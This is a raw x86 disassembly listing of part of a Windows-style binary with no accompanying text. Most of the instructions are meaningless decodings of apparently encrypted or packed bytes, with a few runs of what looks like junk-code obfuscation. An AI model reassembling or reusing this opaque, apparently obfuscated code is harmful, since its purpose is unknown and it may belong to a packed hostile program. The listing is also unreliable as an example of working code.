  40d65d:	lea    edx,[edi+0x4659f8ba]
  40d663:	daa    
  40d664:	adc    DWORD PTR [ebx],eax
  40d666:	retf   0x5506
  40d669:	cmp    dh,BYTE PTR [ebx]
  40d66b:	(bad)  
  40d66c:	loop   0x40d69a
  40d66e:	inc    esi
  40d66f:	stc    
  40d670:	sbb    DWORD PTR [eax-0x2b],esi
  40d673:	call   0x4406:0x5c50ae2
  40d67a:	daa    
  40d67b:	leave  
  40d67c:	sbb    BYTE PTR [eax-0x2a25a88a],bh
  40d682:	jbe    0x40d6c3
  40d684:	cdq    
  40d685:	shr    BYTE PTR [edi+ecx*4-0x9],1
  40d689:	inc    edi
  40d68a:	test   ecx,ebx
  40d68c:	mov    WORD PTR es:[edx],ds
  40d68f:	jecxz  0x40d649
  40d691:	lock enter 0xb4ed,0x18
  40d696:	loopne 0x40d709
  40d698:	repnz adc BYTE PTR [eax-0x6f],ah
  40d69c:	fbld   TBYTE PTR [eax-0x35e47e72]
  40d6a2:	mov    ds:0xd42fa399,eax
  40d6a7:	sbb    eax,0x1269c555
  40d6ac:	mov    bh,0xde
  40d6ae:	(bad)  
  40d6af:	cs push eax
  40d6b1:	scas   eax,DWORD PTR es:[edi]
  40d6b2:	xor    eax,0xaf45ce7e
  40d6b7:	or     al,0xf7
  40d6b9:	inc    eax
  40d6ba:	mov    esp,0x3f7274d0
  40d6bf:	rcr    BYTE PTR [esi],cl
  40d6c1:	mov    BYTE PTR [edi+0x77],ch
  40d6c4:	iret   
  40d6c5:	dec    eax
  40d6c6:	sbb    esp,DWORD PTR [ebp+0x2e739b99]
  40d6cc:	mov    eax,0x8ffc1624
  40d6d1:	retf   0x2e2a
  40d6d4:	and    BYTE PTR [ecx-0x6e],bh
  40d6d7:	inc    ecx
  40d6d8:	or     DWORD PTR ds:0xe7298a43,ecx
  40d6de:	pop    edi
  40d6df:	xchg   ebx,eax
  40d6e0:	or     eax,DWORD PTR [edi-0x57bc79f8]
  40d6e6:	sub    BYTE PTR ss:[ecx-0x3eb77847],dl
  40d6ed:	dec    esi
  40d6ee:	cmp    eax,0xdf640d6c
  40d6f3:	adc    BYTE PTR [edx],bl
  40d6f5:	stc    
  40d6f6:	xchg   DWORD PTR [edx+ebp*4],ecx
  40d6f9:	jns    0x40d6bd
  40d6fb:	(bad)  
  40d6fc:	popa   
  40d6fd:	fdiv   QWORD PTR [eax-0x28a50a3e]
  40d703:	sub    al,0x1a
  40d705:	cld    
  40d706:	neg    DWORD PTR [ecx-0x722c05e1]
  40d70c:	inc    edi
  40d70d:	std    
  40d70e:	dec    edi
  40d70f:	stos   DWORD PTR es:[edi],eax
  40d710:	jecxz  0x40d734
  40d712:	loope  0x40d6af
  40d714:	mov    eax,0x39993177
  40d719:	push   edx
  40d71a:	std    
  40d71b:	scas   al,BYTE PTR es:[edi]
  40d71c:	mov    eax,ds:0xe34c1014
  40d721:	enter  0x960d,0x2a
  40d725:	jnp    0x40d6e4
  40d727:	push   edx
  40d728:	push   0x592eeee1
  40d72d:	retf   0x3a4f
  40d730:	pop    ebp
  40d731:	loope  0x40d6f0
  40d733:	xchg   ebx,eax
  40d735:	jnp    0x40d76a
  40d737:	scas   eax,DWORD PTR es:[edi]
  40d738:	imul   esp,DWORD PTR ss:[ebx-0xbf08ccd],0x2ac4a6c7
  40d743:	dec    esi
  40d744:	in     eax,dx
  40d745:	mov    eax,0x1ed7d1c6
  40d74a:	mov    ecx,fs
  40d74c:	adc    DWORD PTR [eax-0x3c],esi
  40d74f:	and    eax,0xaf9ca34
  40d754:	mov    eax,0x4cf526f2
  40d759:	sub    eax,0x755e3a05
  40d75e:	or     DWORD PTR [eax],0x75
  40d761:	lods   eax,DWORD PTR ds:[esi]
  40d762:	or     BYTE PTR [edi+0x3e],cl
  40d765:	xchg   ecx,eax
  40d766:	cwde   
  40d767:	in     eax,dx
  40d768:	cs mov ebp,0x63d406ab
  40d76e:	aaa    
  40d76f:	jecxz  0x40d7cb
  40d771:	or     dh,dl
  40d773:	fidivr DWORD PTR [edi+eiz*8]
  40d776:	jmp    0xa0666f14
  40d77b:	or     esi,DWORD PTR [ecx-0x41]
  40d77e:	pop    edx
  40d77f:	ficomp WORD PTR [ecx-0x1f]
  40d782:	xchg   ebp,eax
  40d783:	mov    gs,edi
  40d785:	adc    bl,al
  40d787:	jg     0x40d76b
  40d789:	lds    ebx,FWORD PTR [ebx+esi*8+0x7a4171e0]
  40d790:	jecxz  0x40d74f
  40d792:	mov    edx,0x6fc757eb
  40d797:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d798:	jo     0x40d7b0
  40d79a:	sub    BYTE PTR [edx],dh
  40d79c:	sbb    al,0x25
  40d79e:	stc    
  40d79f:	xor    eax,0xe4b98b2e
  40d7a4:	cmp    BYTE PTR [esi-0x23f33566],ch
  40d7aa:	cmp    ecx,0x1d152fad
  40d7b0:	or     al,0x8d
  40d7b2:	sbb    bl,BYTE PTR [eax+edi*1+0x535bbaff]
  40d7b9:	fst    QWORD PTR [ecx+0x69]
  40d7bc:	cmp    edi,0x33c
  40d7c2:	mov    DWORD PTR ds:0x42a7bd,0x14bd
  40d7cc:	jne    0x40dd11
  40d7d2:	and    eax,DWORD PTR ds:0x42a7c5
  40d7d8:	jmp    0x40da30
  40d7dd:	int    0xca
  40d7df:	(bad)  
  40d7e0:	into   
  40d7e1:	(bad)  
  40d7e3:	aad    0xc9
  40d7e5:	lea    edi,[esi+0x5a8ae45d]
  40d7eb:	and    cl,BYTE PTR ds:0x7878a959
  40d7f1:	xor    eax,0x1b78787e
  40d7f6:	sub    cl,al
  40d7f8:	push   esi
  40d7f9:	jp     0x40d864
  40d7fb:	(bad)  
  40d7fc:	out    0x9c,eax
  40d7fe:	bound  ebx,QWORD PTR [esi]
  40d800:	or     BYTE PTR [edi],bh
  40d802:	jle    0x40d79d
  40d804:	sbb    eax,0xc3413469
  40d809:	and    al,BYTE PTR [eax+0x12]
  40d80c:	push   edx
  40d80d:	sub    al,0xfa
  40d80f:	push   edi
  40d810:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d811:	inc    edx
  40d812:	shl    DWORD PTR [ecx+0x194ad37d],cl
  40d818:	jnp    0x40d7bf
  40d81a:	arpl   WORD PTR [ebp-0x2],si
  40d81d:	jb     0x40d7b1
  40d81f:	xchg   ebx,eax
  40d820:	stos   DWORD PTR es:[edi],eax
  40d821:	in     al,dx
  40d822:	nop
  40d823:	jb     0x40d7ed
  40d825:	jns    0x40d806
  40d827:	js     0x40d88d
  40d829:	cmp    cl,BYTE PTR [esp+eiz*4-0x10193649]
  40d830:	scas   eax,DWORD PTR es:[edi]
  40d831:	ins    BYTE PTR es:[edi],dx
  40d832:	bound  esi,QWORD PTR [eax]
  40d834:	dec    eax
  40d835:	inc    esp
  40d836:	mov    ch,0x9b
  40d838:	add    BYTE PTR [edi-0x66],cl
  40d83b:	fst    QWORD PTR [edi-0x8]
  40d83e:	test   BYTE PTR [ecx+0x30b05d23],cl
  40d844:	repnz bound edx,QWORD PTR [edx]
  40d847:	jns    0x40d7fa
  40d849:	mov    ds:0x253b017c,eax
  40d84e:	sub    al,0x93
  40d850:	xchg   edi,eax
  40d851:	out    0x89,eax
  40d853:	xor    esi,esp
  40d855:	pushf  
  40d856:	imul   esi,ecx,0x19
  40d859:	pop    ebp
  40d85a:	mov    ebx,0x66abbc85
  40d85f:	xor    edi,DWORD PTR [ecx+edx*4-0x4dc7195d]
  40d866:	loope  0x40d826
  40d868:	add    al,0x67
  40d86a:	adc    dh,BYTE PTR [edx-0x3b]
  40d86d:	lods   eax,DWORD PTR ds:[esi]
  40d86e:	sbb    al,0x81
  40d870:	das    
  40d871:	pop    ecx
  40d872:	sbb    eax,edx
  40d874:	ror    ecx,cl
  40d876:	stos   DWORD PTR es:[edi],eax
  40d877:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d878:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d879:	(bad)  
  40d87a:	mov    ds:0x80cc0acd,eax
  40d87f:	(bad)  
  40d880:	cli    
  40d881:	adc    eax,0x9662960c
  40d886:	std    
  40d887:	iret   
  40d888:	(bad)  
  40d889:	push   0xffffffb6
  40d88b:	stos   BYTE PTR es:[edi],al
  40d88c:	pop    ebp
  40d88d:	xchg   DWORD PTR [eax-0x7b],ecx
  40d890:	pop    DWORD PTR [eax+ebp*8]
  40d893:	or     al,0xc
  40d896:	lea    edi,[edx]
  40d898:	lea    esi,[edx+0x6c]
  40d89b:	imul   edi,ebx,0x8672676e
  40d8a1:	aad    0xdc
  40d8a3:	mov    eax,0x81faf81d
  40d8a8:	into   
  40d8a9:	imul   esp,DWORD PTR [edx+0x5],0x429b721b
  40d8b0:	es ret 
  40d8b2:	jecxz  0x40d8e8
  40d8b4:	inc    eax
  40d8b5:	pop    edx
  40d8b6:	retf   
  40d8b7:	push   es
  40d8b8:	push   0x75
  40d8ba:	adc    ah,BYTE PTR [edx]
  40d8bc:	icebp  
  40d8bd:	into   
  40d8be:	mov    cl,0xce
  40d8c0:	shr    DWORD PTR [ebx+0x378212e2],cl
  40d8c6:	cmp    bl,BYTE PTR [edi]
  40d8c8:	pop    esp
  40d8c9:	in     eax,0x14
  40d8cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8cc:	sti    
  40d8cd:	push   eax
  40d8ce:	clc    
  40d8cf:	fcmovne st,st(1)
  40d8d1:	pop    ds
  40d8d2:	mov    esi,esi
  40d8d4:	adc    ebp,DWORD PTR [ebp-0xa]
  40d8d7:	leave  
  40d8d8:	sbb    eax,0x2f5b690d
  40d8dd:	out    dx,eax
  40d8de:	data16 out dx,al
  40d8e0:	mov    ecx,0xec42db00
  40d8e5:	pop    edi
  40d8e6:	cmp    DWORD PTR gs:[esi+eiz*4-0x68],ecx
  40d8eb:	add    dh,bl
  40d8ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8ee:	sbb    al,al
  40d8f0:	lahf   
  40d8f1:	push   es
  40d8f2:	xchg   esi,eax
  40d8f3:	cdq    
  40d8f4:	repnz in eax,dx
  40d8f6:	dec    edi
  40d8f7:	jne    0x40d942
  40d8f9:	xchg   ebp,eax
  40d8fa:	and    dl,BYTE PTR ds:0xec7491fc
  40d900:	into   
  40d901:	mov    ebx,0xc7e97b61
  40d906:	push   edi
  40d907:	jmp    0x16c58fca
  40d90c:	jge    0x40d8c9
  40d90e:	retf   
  40d90f:	imul   esi,DWORD PTR [ebp+0x67],0xffffff8e
  40d913:	cld    
  40d914:	out    dx,eax
  40d915:	mov    bh,0xb1
  40d917:	pushf  
  40d918:	sub    BYTE PTR [ebx],cl
  40d91a:	xchg   ebp,eax
  40d91b:	(bad)  
  40d91c:	je     0x40d912
  40d91e:	loopne 0x40d974
  40d920:	xor    ebp,0x29
  40d923:	cmp    ebx,DWORD PTR [ecx]
  40d925:	adc    edx,edi
  40d927:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d928:	es stos DWORD PTR es:[edi],eax
  40d92a:	scas   al,BYTE PTR es:[edi]
  40d92b:	xor    esp,DWORD PTR [ebp-0x3567d973]
  40d931:	fistp  DWORD PTR [eax]
  40d933:	mov    ebx,0x7bf497a7
  40d938:	mov    WORD PTR [eax-0x28ba8e7a],?
  40d93e:	xor    ch,BYTE PTR [edx+0x43]
  40d941:	(bad)  
  40d942:	dec    esp
  40d943:	push   0xeefbb188
  40d948:	or     DWORD PTR [ebp-0x7c],ebx
  40d94b:	repz test al,0x9a
  40d94e:	push   esp
  40d94f:	fadd   DWORD PTR [esp+eiz*2-0x64a5d75f]
  40d956:	mov    WORD PTR [edi+0x34ff70b],ds
  40d95c:	or     BYTE PTR [edx],bl
  40d95e:	shl    BYTE PTR ds:0x99e7e7d6,0x8b
  40d965:	ret    
  40d966:	daa    
  40d967:	xor    bl,BYTE PTR [esi+0x48b47b51]
  40d96d:	lods   al,BYTE PTR ds:[esi]
  40d96e:	xor    al,dh
  40d970:	js     0x40d96e
  40d972:	jmp    0x40d98f
  40d974:	ret    0xc514
  40d977:	pop    ecx
  40d978:	js     0x40d917
  40d97a:	lods   eax,DWORD PTR ds:[esi]
  40d97b:	jae    0x40d901
  40d97d:	mov    bh,0xd8
  40d97f:	mov    ds:0xcc8a5cdc,al
  40d985:	pop    ds
  40d986:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d987:	mov    cl,0x62
  40d989:	adc    dl,BYTE PTR [edx+0x5a85a98c]
  40d98f:	sar    BYTE PTR [edi-0x6f],1
  40d992:	add    eax,0x6cabd4b2
  40d997:	ret    
  40d998:	mov    bh,0xe0
  40d99a:	int    0x35
  40d99c:	std    
  40d99d:	cmp    edx,eax
  40d99f:	push   esp
  40d9a0:	mov    dh,0x2e
  40d9a2:	jmp    0x97531a5
  40d9a7:	outs   dx,BYTE PTR ds:[esi]
  40d9a8:	popfw  
  40d9aa:	(bad)
  40d9ae:	dec    esp
  40d9af:	iret   
  40d9b0:	shr    DWORD PTR [ecx-0x3c371ad9],cl
  40d9b6:	dec    ebp
  40d9b7:	jb     0x40da21
  40d9b9:	retf   0x67d
  40d9bc:	jne    0x40d9c9
  40d9be:	stos   BYTE PTR es:[edi],al
  40d9bf:	test   eax,0x593c7a39
  40d9c4:	jns    0x40d980
  40d9c6:	or     DWORD PTR [ecx+0x47139530],esp
  40d9cc:	es fs inc edx
  40d9cf:	sub    eax,0x8b35a6a
  40d9d4:	inc    edi
  40d9d5:	push   esp
  40d9d6:	pop    esp
  40d9d7:	pop    edi
  40d9d8:	mov    DWORD PTR [esi+ebp*2-0x6f],eax
  40d9dc:	pop    edx
  40d9dd:	jg     0x40d970
  40d9df:	rcl    DWORD PTR [edx+0x7],0xd6
  40d9e3:	imul   ecx,esp,0x6d
  40d9e6:	add    bh,BYTE PTR ds:0x457abca4
  40d9ec:	sbb    BYTE PTR [eax],al
  40d9ee:	cmp    eax,0x139dcc96
  40d9f3:	mov    esi,0x68a44017
  40d9f8:	xchg   ebx,eax
  40d9f9:	fcmovb st,st(4)
  40d9fb:	and    BYTE PTR [edi+0x2d],dl
  40d9fe:	jbe    0x40d9a8
  40da00:	out    0xcf,eax
  40da02:	or     al,0xb1
  40da04:	cdq    
  40da05:	push   ecx
  40da06:	outs   dx,DWORD PTR ds:[esi]
  40da07:	ret    
  40da08:	fidiv  DWORD PTR [eax-0x62]
  40da0b:	mov    eax,ds:0xe893bdf1
  40da10:	dec    ebx
  40da11:	pusha  
  40da12:	sbb    BYTE PTR [edx+0x65],al
  40da15:	ss sbb dl,bl
  40da18:	adc    al,0xc8
  40da1a:	cmp    DWORD PTR [esi+ebx*2],0xe33c2a52
  40da21:	dec    eax
  40da22:	daa    
  40da23:	(bad)  
  40da24:	ficomp DWORD PTR [edx-0x76]
  40da27:	mov    ecx,0x68435c21
  40da2c:	and    al,0xe1
  40da2e:	mov    eax,ds:0x8658368
  40da33:	add    BYTE PTR [ecx+0x42a831],ah
  40da39:	sbb    eax,DWORD PTR ds:0x42a809
  40da3f:	mov    ds:0x42a831,eax
  40da44:	mov    eax,DWORD PTR [ebp-0x8]
  40da47:	xor    DWORD PTR ds:0x42a7f1,0x42a7bd
  40da51:	sub    eax,DWORD PTR [ebp+0x8]
  40da54:	or     DWORD PTR ds:0x42a801,0xc38
  40da5e:	push   eax
  40da5f:	adc    DWORD PTR ds:0x42a771,0x6147
  40da69:	mov    eax,DWORD PTR [ebp-0x4]
  40da6c:	jmp    0x40dcc4
  40da71:	enter  0xc6c0,0x3c
  40da75:	(bad)  
  40da76:	ret    0xd4da
  40da79:	push   cs
  40da7a:	in     al,dx
  40da7b:	pop    edi
  40da7c:	dec    esi
  40da7d:	fidivr DWORD PTR [edi]
  40da7f:	sub    ebp,DWORD PTR [esi+edx*1-0x52]
  40da83:	js     0x40dafd
  40da85:	xor    eax,0x3778787e
  40da8a:	and    DWORD PTR [eax+0x6b],esp
  40da8d:	inc    eax
  40da8e:	xchg   ebx,eax
  40da8f:	pop    edx
  40da90:	aaa    
  40da91:	sbb    al,0x7f
  40da93:	cmp    dl,ch
  40da95:	mov    eax,ds:0xe4e7f73d
  40da9a:	mov    edi,0x724d27f4
  40da9f:	das    
  40daa0:	mov    cl,0xbd
  40daa2:	fild   QWORD PTR [eax]
  40daa4:	adc    BYTE PTR [ebp+0x651d69d4],al
  40daaa:	push   cs
  40daab:	ffreep st(3)
  40daad:	cwde   
  40daae:	fwait
  40daaf:	push   edi
  40dab0:	push   ecx
  40dab1:	inc    esi
  40dab2:	jnp    0x40da53
  40dab4:	(bad)  
  40dab5:	loop   0x40da6a
  40dab7:	pop    esi
  40dab8:	mov    ch,0x7e
  40daba:	xor    eax,0x2aa5a9b4
  40dabf:	sbb    DWORD PTR [eax-0x2c824098],0xffffffbf
  40dac6:	jno    0x40da4b
  40dac8:	ror    al,0xb1
  40dacb:	(bad)  
  40dacc:	push   ss
  40dacd:	dec    edi
  40dace:	xchg   ecx,eax
  40dacf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dad0:	pop    ebx
  40dad1:	vmread edx,eax
  40dad4:	jg     0x40da58
  40dad6:	dec    edi
  40dad7:	add    eax,0x210d175c
  40dadc:	cld    
  40dadd:	fldenv [eax]
  40dadf:	pushf  
  40dae0:	rcl    BYTE PTR [si-0x79],0x44
  40dae5:	fdiv   DWORD PTR ds:0x453c7506
  40daeb:	fst    QWORD PTR [ebx+esi*1-0x3]
  40daef:	jge    0x40da91
  40daf1:	int3   
  40daf2:	mov    eax,ds:0xf96351a6
  40daf7:	sbb    al,0x22
  40daf9:	sbb    ecx,DWORD PTR [edx]
  40dafb:	ss jmp 0x40db71
  40dafe:	sub    al,0x92
  40db00:	pop    es
  40db01:	retf   
  40db02:	lds    edx,FWORD PTR [ebx]
  40db04:	leave  
  40db05:	out    dx,al
  40db06:	sub    edx,edx
  40db08:	inc    ebp
  40db09:	jne    0x40db1d
  40db0b:	xchg   BYTE PTR [eax+0xcc9d878],bl
  40db11:	push   es
  40db12:	mov    dl,0x4b
  40db14:	dec    ebp
  40db15:	xor    DWORD PTR [edx+edx*2+0x65],eax
  40db19:	adc    BYTE PTR [ebx+eiz*4],ah
  40db1c:	mov    ebx,0xb827a2a8
  40db21:	call   0xffee8d73
  40db26:	jno    0x40daed
  40db28:	adc    bl,BYTE PTR [esi+0x51]
  40db2b:	sbb    al,0x6f
  40db2d:	sub    eax,0xf579c085
  40db32:	mov    bl,0xc6
  40db34:	adc    dh,BYTE PTR [edx-0x2d]
  40db37:	in     al,0x5f
  40db39:	fldcw  WORD PTR [ebx+0x17]
  40db3c:	sbb    ah,BYTE PTR ds:0x3e78578
  40db42:	mov    dh,0x9f
  40db44:	push   ebp
  40db45:	adc    BYTE PTR [ebp+0x57c68dcc],ah
  40db4b:	mov    ebx,DWORD PTR [ebp+0x42e2f3c0]
  40db51:	aam    0xe9
  40db53:	mov    al,ds:0x7f8efa3f
  40db58:	cmp    dl,0x26
  40db5b:	dec    edx
  40db5c:	xchg   BYTE PTR [edx],cl
  40db5e:	inc    edx
  40db5f:	add    BYTE PTR [edx+0x2601f692],0xc
  40db66:	add    DWORD PTR [ebx],edi
  40db68:	lea    esp,[edx+ecx*1]
  40db6b:	xor    BYTE PTR ds:0xa5b73241,bh
  40db71:	fs add esi,esi
  40db74:	ds mov bl,0x28
  40db77:	sahf   
  40db78:	mov    al,ds:0xf3f2d206
  40db7d:	(bad)  
  40db7f:	sbb    al,0x6d
  40db81:	in     al,dx
  40db82:	cld    
  40db83:	add    ah,bl
  40db85:	mov    esi,0x26bac7d0
  40db8a:	and    al,0xc6
  40db8c:	jmp    0x5b1e:0x2cc69836
  40db93:	push   ebx
  40db94:	push   ss
  40db95:	lods   eax,DWORD PTR ds:[esi]
  40db96:	rcl    DWORD PTR [ebp+eiz*8+0x6c192c19],1
  40db9d:	dec    ebx
  40db9e:	imul   DWORD PTR [ebx+eax*4-0x47d79c9c]
  40dba5:	stc    
  40dba6:	mov    ch,0xa9
  40dba8:	es jae 0x40db81
  40dbab:	sbb    al,bh
  40dbad:	imul   esi,DWORD PTR [esp+eax*8-0xf],0x76d62968
  40dbb5:	jle    0x40dc14
  40dbb7:	xor    bl,BYTE PTR [edi-0x3f4aea97]
  40dbbd:	mov    ah,0x7d
  40dbbf:	int3   
  40dbc0:	outs   dx,BYTE PTR ds:[esi]
  40dbc1:	jno    0x40db52
  40dbc3:	pop    esp
  40dbc4:	sahf   
  40dbc5:	outs   dx,BYTE PTR ds:[esi]
  40dbc6:	cmp    al,0x8f
  40dbc8:	lods   eax,DWORD PTR ds:[esi]
  40dbc9:	push   DWORD PTR [ebp+0x5a40efb]
  40dbcf:	fs and al,0x89
  40dbd2:	push   es
  40dbd3:	inc    ebx
  40dbd4:	pop    edx
  40dbd5:	pop    edi
  40dbd6:	bound  esi,QWORD PTR [edx-0x7ad5bf93]
  40dbdc:	or     ah,0x59
  40dbdf:	mov    ds:0x9cccde1b,eax
  40dbe4:	push   ecx
  40dbe5:	aas    
  40dbe6:	jb     0x40dba3
  40dbe8:	test   eax,0x1952c4fd
  40dbed:	mov    ebx,0x3d33c6c8
  40dbf2:	test   DWORD PTR [ecx],0xe5a8db10
  40dbf8:	adc    esp,ebx
  40dbfa:	xor    DWORD PTR [edi],0x6a2736f7
  40dc00:	imul   ecx,DWORD PTR [esp+esi*4-0x7e8362dd],0x3a6e6db5
  40dc0b:	fs mov ebp,0x8f0a72ec
  40dc11:	int3   
  40dc12:	xchg   esp,eax
  40dc13:	xor    BYTE PTR [edx-0x9],ch
  40dc16:	imul   edi,DWORD PTR [ecx+0x1d],0xa3215c13
  40dc1d:	sar    DWORD PTR [ebx-0x69],cl
  40dc20:	push   es
  40dc21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc22:	repz sbb edx,DWORD PTR [edx+0x59]
  40dc26:	push   DWORD PTR [ebp+ebp*2-0x957b86c]
  40dc2d:	xor    BYTE PTR [ebx],al
  40dc2f:	test   eax,0x6f278a0f
  40dc34:	in     eax,0xd0
  40dc36:	sub    BYTE PTR [edx-0x706b953e],al
  40dc3c:	cmp    al,0x3b
  40dc3e:	mov    eax,ds:0x36048c35
  40dc43:	mov    ds:0x6ba5847a,al
  40dc48:	add    dh,BYTE PTR [eax+0x12b13cdd]
  40dc4e:	pop    edx
  40dc4f:	and    DWORD PTR [esi+esi*1-0x7b],eax
  40dc53:	ret    
  40dc54:	(bad)  
  40dc56:	sbb    al,0xa7
  40dc58:	cmp    BYTE PTR [ebp+0x1e],ch
  40dc5b:	dec    edx
  40dc5c:	sub    bl,BYTE PTR [ebx]
  40dc5e:	or     esp,DWORD PTR [ebp-0x7f50953]
  40dc64:	jp     0x40dbee
  40dc66:	mov    edx,0x9d14e000
  40dc6b:	mov    gs,WORD PTR [edi-0x32]
  40dc6e:	adc    ebx,edi
  40dc70:	and    eax,0x65d9748a
  40dc75:	mov    cl,0x97
  40dc77:	push   edx
  40dc78:	pop    edi
  40dc79:	xchg   edx,eax
  40dc7a:	or     DWORD PTR [ecx-0x53916628],ebp
  40dc80:	popa   
  40dc81:	and    DWORD PTR [ebx-0x5b],ebx
  40dc84:	adc    eax,0xa43ef35f
  40dc89:	mov    al,ds:0x24295cfe
  40dc8e:	test   eax,0x97988035
  40dc93:	add    al,0x67
  40dc95:	iret   
  40dc96:	push   0x61c7d480
  40dc9b:	xchg   esi,eax
  40dc9c:	(bad)  
  40dc9d:	lock and eax,0x137765e
  40dca3:	xor    cl,BYTE PTR [edx-0x162525fa]
  40dca9:	fsub   st,st(6)
  40dcab:	(bad)  
  40dcac:	inc    ebx
  40dcad:	rcr    eax,0x54
  40dcb0:	xlat   BYTE PTR ds:[ebx]
  40dcb1:	push   ebx
  40dcb2:	mov    dh,BYTE PTR [esi]
  40dcb4:	loopne 0x40dc70
  40dcb6:	dec    edx
  40dcb7:	and    eax,0x6301f93c
  40dcbc:	loopne 0x40dd2a
  40dcbe:	push   ss
  40dcbf:	hlt    
  40dcc0:	jo     0x40dca9
  40dcc2:	mov    cl,0xec
  40dcc4:	add    eax,DWORD PTR [ebp+0x8]
  40dcc7:	add    DWORD PTR ds:0x42a881,0x296a
  40dcd1:	push   eax
  40dcd2:	adc    DWORD PTR ds:0x42a75d,0x7658
  40dcdc:	call   0x40e99f
  40dce1:	mov    DWORD PTR ds:0x42a7b5,0x7bae
  40dceb:	inc    DWORD PTR [ebp+0x8]
  40dcee:	cmp    DWORD PTR [ebp+0x8],0x52
  40dcf2:	mov    DWORD PTR ds:0x42a831,0x71fa
  40dcfc:	jb     0x40da34
  40dd02:	mov    DWORD PTR ds:0x42a83d,0x568b
  40dd0c:	jmp    0x40e979
  40dd11:	cmp    edi,0x1a2
  40dd17:	jne    0x40e497
  40dd1d:	sbb    DWORD PTR ds:0x42a7b9,edx
  40dd23:	mov    DWORD PTR [ebp-0x60],0xf89c853c
  40dd2a:	mov    eax,DWORD PTR [ebp-0x4]
  40dd2d:	mov    DWORD PTR [ebp-0x5c],eax
  40dd30:	mov    eax,DWORD PTR [ebp-0x8]
  40dd33:	mov    DWORD PTR [ebp-0x58],eax
  40dd36:	movzx  eax,WORD PTR ds:0x42a7b1
  40dd3d:	and    DWORD PTR ds:0x42a781,eax
  40dd43:	mov    eax,DWORD PTR [ebp-0xc]
  40dd46:	adc    DWORD PTR ds:0x42a871,0x42a87d
  40dd50:	xor    eax,esi
  40dd52:	jmp    0x40dfaa
  40dd57:	rol    eax,0x3e
  40dd5a:	leave  
  40dd5b:	leave  
  40dd5c:	leave  
  40dd5d:	leave  
  40dd5e:	rcr    BYTE PTR [ebx+0x66],0x3b
  40dd62:	inc    esi
  40dd63:	int    0xef
  40dd65:	loopne 0x40dd1c
  40dd67:	shr    DWORD PTR [eax+edi*2+0x787e3578],cl
  40dd6e:	js     0x40dd53
  40dd70:	mov    eax,ds:0x352fad47
  40dd75:	xchg   esp,eax
  40dd76:	xor    esi,DWORD PTR [ebx]
  40dd78:	fst    st(0)
  40dd7a:	mov    bh,0x41
  40dd7c:	cdq    
  40dd7d:	push   esp
  40dd7e:	leave  
  40dd7f:	add    eax,0x812027b0
  40dd84:	mov    dh,0x1b
  40dd86:	push   0xb
  40dd88:	dec    ecx
  40dd89:	enter  0x30ae,0x2d
  40dd8d:	jbe    0x40dd23
  40dd8f:	outs   dx,DWORD PTR ds:[esi]
  40dd90:	mov    bl,0x18
  40dd92:	push   ebp
  40dd93:	adc    BYTE PTR ds:0x7b7c0df5,0x6c
  40dd9a:	inc    ecx
  40dd9b:	lds    esi,FWORD PTR [ebp+0x5d]
  40dd9e:	call   0x8ed396d9
  40dda3:	mov    ds,esp
  40dda5:	test   DWORD PTR [eax-0x7a],0x5ffcc4fa
  40ddac:	add    al,0xfc
  40ddae:	rcl    DWORD PTR [edx+ecx*8+0x65],cl
  40ddb2:	dec    ebx
  40ddb3:	or     eax,0x4b9725cd
  40ddb8:	sbb    al,0x8d
  40ddba:	ja     0x40dd80
  40ddbc:	push   0x2a14bef5
  40ddc1:	cmp    ebx,esp
  40ddc3:	or     edx,ebp
  40ddc5:	out    0xca,al
  40ddc7:	pop    es
  40ddc8:	xor    eax,0xcd77e7ad
  40ddcd:	idiv   BYTE PTR [ecx-0x1e037154]
  40ddd3:	div    edi
  40ddd5:	push   cs
  40ddd6:	cmp    ah,cl
  40ddd8:	jne    0x40dd96
  40ddda:	dec    ebp
  40dddb:	not    DWORD PTR [edx+0x79]
  40ddde:	into   
  40dddf:	call   0xeac35aa9
  40dde4:	fmulp  st(5),st
  40dde6:	fs mov ah,0x65
  40dde9:	jge    0x40dd96
  40ddeb:	and    dh,ch
  40dded:	outs   dx,BYTE PTR ds:[esi]
  40ddee:	cmp    ebp,DWORD PTR [esi+0x766542f0]
  40ddf4:	mov    ah,0xed
  40ddf6:	scas   eax,DWORD PTR es:[edi]
  40ddf7:	push   eax
  40ddf8:	xor    esi,DWORD PTR [ebp+0x2d]
  40ddfb:	xlat   BYTE PTR ds:[ebx]
  40ddfc:	in     al,dx
  40ddfd:	adc    DWORD PTR [ecx-0x30fd970a],eax
  40de03:	(bad)  
  40de04:	idiv   BYTE PTR [eax-0x48]
  40de07:	jecxz  0x40de0c
  40de09:	dec    ecx
  40de0a:	movs   BYTE PTR es:[di],BYTE PTR fs:[si]
  40de0d:	call   0x11d3682d
  40de12:	mov    ch,0x9a
  40de14:	pop    ecx
  40de15:	mov    ah,BYTE PTR [ecx-0x88dfd34]
  40de1b:	and    BYTE PTR [eax],dl
  40de1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de1e:	mov    ecx,DWORD PTR [eax-0x76]
  40de21:	call   0xc787:0x1c81d6b4
  40de28:	or     BYTE PTR [esi+0x61959337],ah
  40de2e:	daa    
  40de2f:	cs retf 0x3e1e
  40de33:	cmp    ebx,ebx
  40de35:	push   edi
  40de36:	push   edx
  40de37:	pop    es
  40de38:	xchg   ebp,eax
  40de39:	mov    gs,eax
  40de3b:	push   esi
  40de3c:	ins    DWORD PTR es:[edi],dx
  40de3d:	push   0x28f133f9
  40de42:	data16 mov bh,0xc9
  40de45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de46:	out    dx,al
  40de47:	les    ebx,FWORD PTR [edi]
  40de49:	(bad)
  40de4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de4f:	add    ebx,esp
  40de51:	xchg   BYTE PTR ds:0x69977db2,bh
  40de57:	icebp  
  40de58:	sub    ch,BYTE PTR [ebp-0xd260a73]
  40de5e:	jl     0x40dec5
